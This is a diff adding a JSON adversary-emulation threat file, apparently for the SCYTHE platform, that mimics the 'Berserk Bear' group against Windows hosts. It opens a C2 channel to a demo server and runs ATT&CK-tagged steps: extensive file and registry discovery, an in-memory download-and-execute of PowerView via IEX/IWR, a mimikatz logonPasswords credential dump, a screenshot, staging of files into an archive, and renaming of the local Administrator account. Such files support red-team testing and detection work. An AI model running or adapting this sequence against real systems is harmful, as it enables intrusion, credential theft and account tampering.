@@ -1,0 +1,564 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Berserk Bear",
+        "display_name": "Threat Thursday - Berserk Bear",
+        "name": "Threat Thursday - Berserk Bear",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "helios.scythedemo.com:443",
+                    "--multipart": 10240,
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir /s c:\\ >> %temp%\\download",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "3": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir /s \"c:\\Documents and Settings\" >> %temp%\\download",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir /s \"c:\\Program Files\\\" >> %temp%\\download",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir \"%systemdrive%\\Users\\*.*\" >> %temp%\\download",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\download",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\download",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c tree /F >> %temp%\\download",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c net share",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1135"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c tasklist",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1057"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1012"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "31": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-UserHunter -Stealth -Verbose}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "32": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {Get-NetTCPConnection}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1049"
+                ],
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c systeminfo",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c ipconfig /all",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "36": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c netsh interface show",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "37": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c arp -a",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "38": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c nbtstat -n",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "39": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c net config",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "40": {
+                "module": "loader",
+                "module_to_load": "mimikatz",
+                "request": "--load mimikatz",
+                "type": "message"
+            },
+            "41": {
+                "module": "loader",
+                "module_to_load": "printscr",
+                "request": "--load printscr",
+                "type": "message"
+            },
+            "42": {
+                "depends_on": "4346510a-3dad-4302-8572-2bcdc8bc2e2c",
+                "module": "printscr",
+                "request": "--window Desktop",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1113"
+                ],
+                "type": "message"
+            },
+            "43": {
+                "depends_on": "acc295cf-e232-4a4d-9210-1a6911beb4f8",
+                "module": "mimikatz",
+                "request": "--arglist sekurlsa::logonPasswords",
+                "type": "message"
+            },
+            "44": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c mkdir %USERPROFILE%\\Desktop\\berserk",
+                "type": "message"
+            },
+            "45": {
+                "module": "loader",
+                "module_to_load": "file",
+                "request": "--load file",
+                "type": "message"
+            },
+            "46": {
+                "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
+                "module": "file",
+                "request": "--create --path \"%USERPROFILE%\\Desktop\\berserk\\target_file.xls\" --size 5MB --count 10 --random",
+                "type": "message"
+            },
+            "47": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell \"Compress-Archive %USERPROFILE%\\Desktop\\berserk %USERPROFILE%\\Desktop\\berserk.zip\"",
+                "rtags": [
+                    "att&ck-technique:T1560"
+                ],
+                "type": "message"
+            },
+            "48": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG ADD HKEY_CURRENT_USER\\Software\\ExampleRegKey /v Example /d \"Example Data\" /f",
+                "type": "message"
+            },
+            "49": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG QUERY HKEY_CURRENT_USER\\Software\\ExampleRegKey",
+                "type": "message"
+            },
+            "50": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c REG DELETE HKEY_CURRENT_USER\\Software\\ExampleRegKey /f",
+                "type": "message"
+            },
+            "51": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd \"Invoke-Command -ScriptBlock {$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHaHa_$x$y$z$w\n\n$hostname = (Get-CIMInstance CIM_ComputerSystem).Name\n\n$fmm = Get-CimInstance -ClassName win32_group -Filter \"name = 'Administrators'\" | Get-CimAssociatedInstance -Association win32_groupuser | Select Name\n\nforeach($member in $fmm) {\n    if($member -like \"*Administrator*\") {\n        Rename-LocalUser -Name $member.Name -NewName \"HaHaHa_$x$y$z$w\"\n        Write-Host \"Successfully Renamed Administrator Account on\" $hostname\n        }\n    }}\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0003",
+                    "att&ck-technique:T1098"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
